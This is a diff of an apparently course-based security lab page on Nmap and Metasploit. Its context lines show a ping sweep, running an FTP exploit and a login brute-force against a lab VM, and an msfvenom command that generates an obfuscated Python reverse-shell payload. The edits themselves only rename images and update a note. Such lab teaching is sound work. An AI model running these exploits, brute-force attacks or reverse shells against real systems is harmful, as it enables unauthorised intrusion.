@@ -129,7 +129,7 @@ e.g.,
 nmap -sn 192.168.64.0/24
 ```
 
-![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
 
 Here, the flag `-sn` indicates that it uses ping to check whether the host exists or not. So this is basically a script that runs a ping command to the given network address(es)! There are other flags that could be used, which you can find more from [>>here<<](https://nmap.org/book/man-briefoptions.html).
 
@@ -203,7 +203,7 @@ Next, we need to check options to see what inputs the exploit requires.
 show options
 ```
 
-![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
 
 The exploit is actually simple, and only requires the target host's IP address. So set the RHOST with the target IP address found using Nmap (the RPORT is already set, but if the FTP service runs on a different port or if the RPORT is not set, you can update/set it).
 
@@ -215,7 +215,7 @@ set RHOST 192.168.64.5
 
 All options are set, so now we can run the exploit by simply typing `run`.
 
-![](<../.gitbook/assets/image (2) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
 
 {% hint style="info" %}
 The exploit may fail (as shown above), but you can simply run it again.
@@ -264,7 +264,7 @@ use 0
 show options
 ```
 
-![](<../.gitbook/assets/image (3) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
 Like before, set the `RHOST` to be the target IP address. In addition, we must also provide the wordlist for username and password (you can either provide a single file that contains the pairs in `USERPASS_FILE`, or separately to try all pairs from the two files for `USER_FILE` and `PASS_FILE`). You can also read other option descriptions to change as necessary. For our bruteforce attack, we will use a `USERPASS_FILE` that comes with Metasploit.
 
@@ -326,7 +326,7 @@ The Metasploit also comes with tools to create vulnerable executable scripts/fil
 msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker listening port]
 ```
 
-![](<../.gitbook/assets/image (3) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1).png>)
 
 The payload created is a python executable code, which you can execute from your victim host. You will also notice that `msfvenom` applied code obfuscation techniques so that you cannot directly read the payload to understand exactly what this code is doing.
 
@@ -386,7 +386,7 @@ There isn't much to this code really (i.e., typical socket handling in c), the m
 
 This is where we prepare for command transmission (lines 93 - 96), and send the command (lines 99 - 103). Now let's have a look at the victim's code in `victim.c` file.
 
-![](<../.gitbook/assets/image (7) (1).png>)
+![](<../.gitbook/assets/image (7) (1) (1).png>)
 
 Again, nothing much in the code other than typical socket coding for the client, BUT look at lines 61 - 63. This is where the reverse shell happens:
 
@@ -405,8 +405,8 @@ However, this code does not have any obfuscation, which means it is very easy to
 
 In this lab, we covered two useful tools, Nmap and Metasploit. There were additional exercises to better understand how such tools work (port scanner and reverse shell) to provide a deeper understanding of different exploit techniques.
 
-Next up, Vulnerabilities.
+Next up, Malware.
 
 {% hint style="info" %}
-PREPARATION: the next lab uses a new VM - Windows 10. The ISO file is HUGE (5.5G), so please download and setup the Windows 10 VM before going to the lab.
+PREPARATION: the next lab uses a new VM - Windows 10. The ISO file is HUGE (\~6GB), so please download and set up the Windows 10 VM before going to the lab.
 {% endhint %}
